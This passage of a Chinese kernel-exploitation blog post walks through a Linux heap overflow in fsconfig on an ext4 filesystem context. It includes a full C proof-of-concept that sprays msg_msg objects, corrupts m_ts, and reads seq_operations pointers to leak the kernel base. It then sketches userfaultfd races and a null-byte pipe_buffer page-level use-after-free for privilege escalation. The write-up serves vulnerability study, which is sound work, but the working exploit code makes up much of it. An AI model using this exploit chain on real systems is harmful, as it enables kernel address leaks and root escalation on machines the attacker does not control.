<p><img src="http://imgsrc.baidu.com/forum/pic/item/f31fbe096b63f6247571ef32c144ebf81a4ca3d7.jpg" srcset="/img/loading.gif" lazyload></p>
<p>下图就是我们最后一次fsconfig的情况</p>
<p><img src="http://imgsrc.baidu.com/forumm/pic/item/b999a9014c086e06eb86e97a44087bf40ad1cbd2.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到我们的m_ts字段被修改为了0x1060,这样以来我们就可以越界进行读取，大伙还记得上面额外分配的kmalloc-32吗，接下来就得靠它了，之前顺便堆喷他的原因是为了让我们的seq_operation和他有一定概率出现在同一个slab里面</p>
<p>之后后面的泄露就是寻常化了，直接利用msgrcv系统调用，造成OOB_read，越界读取额外的msg_msgseg相邻的seq_operations函数指针，如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">seq_operations</span> &#123;<br>	<span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-built_in">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>	<span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-built_in">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>经过调试过程可得知，该seq_operations-&gt;start函数初始化为内核中的<code>single_start</code>函数，这样以来我们就可以实现内核基地址的泄露了</p>
<p>即可成功泄露基地址，但是我目前泄露是失败的，之后再看:(</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688701c6395e2c27d1ed21b24e1.jpg" srcset="/img/loading.gif" lazyload></p>
<p>之后发现这里应该是由于多核心的缘故，导致<code>kmalloc</code>有一定几率转到别的核心CPU上面分配，所以导致的失败，所以这里进行一个简单的绑核即可寻找到固定偏移，如下：（后期考证也发现不绑核也可以成功，但成功率会大大下降，所以这里我们绑核了较好）</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939016c1a510f3dec54e736d196e3.jpg" srcset="/img/loading.gif" lazyload></p>
<p>下面的泄露poc也进行了相应修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_PRIVATE (long)0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_CREAT  00001000   <span class="hljs-comment">/* create if key is nonexistent */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_NOWAIT 00004000   <span class="hljs-comment">/* return error on wait */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_NOERROR     010000  <span class="hljs-comment">/* no error if message is too big */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SINGLE_START_OFFSET 0x35f200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgget 186</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgsnd 189</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgrcv 188</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">int</span> fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">long</span> mtype;          <span class="hljs-comment">/* type of message */</span><br>	<span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];                  <span class="hljs-comment">/* message text */</span><br><br>&#125;msg;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> key, <span class="hljs-type">int</span> msgflg)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(key, msgflg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span>&#123;<br><br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, msgflg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_check_leak</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span> <br>&#123;<br>    <span class="hljs-type">uint64_t</span> kbase = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)buf)[<span class="hljs-number">510</span>];<br>    <span class="hljs-keyword">if</span>(!kbase)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;   <br>    kbase -= SINGLE_START_OFFSET; <br>    <span class="hljs-keyword">return</span> kbase;<br>&#125;<br><br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> kernel_base;<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;, recieved[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;;      <span class="hljs-comment">//PAGE_SIZE*2</span><br>    <span class="hljs-type">int</span> targets[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    msg* message = (msg* )(buffer); <br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0x1018</span>;      <br>    <span class="hljs-comment">/* msg_msg: (0x30)head, (0xfd0)message_0</span><br><span class="hljs-comment">     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-comment">/* spray the msg_msg */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span>|IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);      <span class="hljs-comment">/* spray the 0x1018 msg_msg from the kmalloc-4k */</span><br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(pat, <span class="hljs-number">0x42</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>    pat[<span class="hljs-keyword">sizeof</span>(pat) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <br>    <br>    info_log(<span class="hljs-string">&quot;Opening the ext4 filesystem&quot;</span>);<br>    fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>        fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* overflow, hopefully causes an OOB read on a potential msg_msg object below */</span><br>    info_log(<span class="hljs-string">&quot;Overflowing...&quot;</span>);<br>    pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <span class="hljs-type">char</span> evil[] = <span class="hljs-string">&quot;\x60\x10&quot;</span>;<br>    <span class="hljs-comment">/* it will write 23(21 + &#x27;,&#x27; + &#x27;=&#x27;) bytes</span><br><span class="hljs-comment">     * but the up(4095) reserve &#x27;\x00&#x27;, one byte</span><br><span class="hljs-comment">     * so this time we overflow 22 byte </span><br><span class="hljs-comment">     * */</span><br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">// spray more msg_msg</span><br>    <span class="hljs-comment">/* it will spray the legacy data in some one spraying obj </span><br><span class="hljs-comment">     * that is because kmalloc-cg-4k from a 8K chunk :)</span><br><span class="hljs-comment">     * it could include 8 kmalloc-cg-4k</span><br><span class="hljs-comment">     * we can use cmd [sudo cat /proc/slabinfo] for checking</span><br><span class="hljs-comment">     * */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">0x10</span>; i++) <br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;overflow the msg-&gt;m_ts&quot;</span>);<br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, evil, <span class="hljs-number">0</span>);<br>    <br>    info_log(<span class="hljs-string">&quot;heap overflow done&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;Start spraying kmalloc-32 for seq_operations&quot;</span>);<br>    <br>    size = <span class="hljs-number">0x1060</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>        open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    &#125; <br>    <br>    info_log(<span class="hljs-string">&quot;Recieving the leak data...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x10</span>; j++)&#123;<br>        recv_msg(targets[j], recieved, size, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>        kernel_base = do_check_leak(recieved);<br>        <span class="hljs-comment">//kernel_base = ((unsigned long *)recieved)[511];</span><br>        <span class="hljs-keyword">if</span>(kernel_base)&#123;<br>            PRINT_ADDR(<span class="hljs-string">&quot;kernel_base&quot;</span>, kernel_base);<br>            close(fd);<br>            <span class="hljs-keyword">return</span> kernel_base;<br>        &#125;<br>    &#125;<br>    error_log(<span class="hljs-string">&quot;leak kernel_base failed!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    do_leak();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="2-userfaultfd利用"><a href="#2-userfaultfd利用" class="headerlink" title="2.userfaultfd利用"></a>2.userfaultfd利用</h2><p>泄露完内核基地址后，我们就该考虑如何进行利用了，这里在读完源码之后可以发现，在我们调用msgsnd的过程中，走到load_msg这样一个函数，会使用copy_from_user来将我们传入的buf传递给创建的msg当中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br>	<span class="hljs-type">int</span> err = -EFAULT;<br>	<span class="hljs-type">size_t</span> alen;<br><br>	msg = alloc_msg(len);<br>	<span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>	alen = min(len, DATALEN_MSG);<br>	<span class="hljs-keyword">if</span> (copy_from_user(msg + <span class="hljs-number">1</span>, src, alen)) 		<span class="hljs-comment">//这里会访问到我们的 __user *src指针，那么此时可以发动我们的userfaultfd来将其卡在这里</span><br>		<span class="hljs-keyword">goto</span> out_err;<br><br>	<span class="hljs-keyword">for</span> (seg = msg-&gt;next; seg != <span class="hljs-literal">NULL</span>; seg = seg-&gt;next) &#123;<br>		len -= alen;<br>		src = (<span class="hljs-type">char</span> __user *)src + alen;<br>		alen = min(len, DATALEN_SEG);<br>		<span class="hljs-keyword">if</span> (copy_from_user(seg + <span class="hljs-number">1</span>, src, alen))<br>			<span class="hljs-keyword">goto</span> out_err;<br>	&#125;<br><br>	err = security_msg_msg_alloc(msg);<br>	<span class="hljs-keyword">if</span> (err)<br>		<span class="hljs-keyword">goto</span> out_err;<br><br>	<span class="hljs-keyword">return</span> msg;<br><br>out_err:<br>	free_msg(msg);<br>	<span class="hljs-keyword">return</span> ERR_PTR(err);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们知道，当我们走到load_msg的时候，会首先通过<code>alloc_msg</code>来分配一个msg_msg数据结构，很有可能也包括msg_msgseg，分配好空间返回到load_msg后，则会调用copy_from_user来将我们用户空间的内容复制到msg_msg当中，这时如果我们在分配好空间之后，调用copy_from_user之前将我们分配的msg_msg-&gt;next指针修改一下，那么就可以达成一个任意写的功效</p>
<p>需要实现这样时机巧妙的操作，在内核版本5.11以前我们可以利用userfaultfd这样的条件竞争手法</p>
<h2 id="3-空字节堆溢出"><a href="#3-空字节堆溢出" class="headerlink" title="3.空字节堆溢出"></a>3.空字节堆溢出</h2><p>该解法甚是巧妙，第一次出现于<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">arttnba3师傅在d3ctf中的出题笔记</a>并被应用到该漏洞之中，该解法既可以在简单的pwn环境下使用，也可以不用考虑到内核5.11后userfaultfd的使用权限问题。且仅需要堆溢出1个空字节即可完成提权。牛牛爆了(bushi</p>
<h3 id="1-初期知识准备"><a href="#1-初期知识准备" class="headerlink" title="1.初期知识准备"></a>1.初期知识准备</h3><p>我们该如何使用仅仅一个字节来达成地址泄露甚至说是权限提升呢？这里我们考虑到某些结构体，在不破坏其结构形式的情况下，仅溢出一字节是一个很好的办法，但是介于内核中地址的随机性，我们不如将其定为溢出空字节</p>
<p>如果说这里我们溢出到的某个结构体开头第一个字段为一个指针，那么这样我们就可以修改指针地址，使其指向我们尽可能可以操纵的地区，这里根据博客的提示，我们就可以选用pipe_buffer这个结构体进行利用，他的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *	@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *	@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *	@len: length of data inside the @page</span><br><span class="hljs-comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *	@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *	@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这里简单说一下在本次利用当中较为重要字段的含义</p>
<ul>
<li>page:该pipe_buffer所容纳内容的页面</li>
<li>offset:该pipe_buffer数据在page页面的偏移，同时也是read系统调用的指针所在</li>
<li>len:该pipe_buffer数据总共的长度，offset+len就是write系统调用的指针所在</li>
</ul>
<p>可以看到该结构体开头即为<code>struct page</code>的一个指针，且该page结构体大小为0x40字节，其刚好可以被0x100整除（也就是说page结构体指针的低一字节只可能是<code>\x00</code>,<code>\x40</code>,<code>\x80</code>,<code>\xc0</code>），因此我们即可断定在堆喷的情况下，我们可以覆盖某个pipe_buffer的开头低一字节为<code>\x00</code>，来使得他指向某个其他pipe_buffer指向的page结构体，具体情况如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd40ced8b03e78b87d6277ff930.jpg" srcset="/img/loading.gif" lazyload></p>
<p>上面是初始分配的两个pipe_buffer,接下来我们假定其中一个pipe_buffer的page指针低一子节为<code>\x00</code>（1&#x2F;4的概率</p>
<p>然后我们利用空字节溢出，将下面低字节非<code>\x00</code>进行溢出</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/03087bf40ad162d921285b2e57dfa9ec8a13cd3a.jpg" srcset="/img/loading.gif" lazyload></p>
<p>此时即可将两者的指针指向同一个page结构体，然后通过释放其中一个管道来使得构造成页级UAF</p>
<p>但是这里的一个问题就是，pipe_buffer每次调用是从kmalloc-cg-1k进行获取，伙伴系统中则是从order-2当中取得，而我们的legacy_data则是从kmalloc-cg-4k中获取，伙伴系统则是从order-3当中取出，因此我们不能通过寻常的函数获取pipe_buffer,如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/562c11dfa9ec8a13b08b73d2b103918fa0ecc06b.jpg" srcset="/img/loading.gif" lazyload></p>
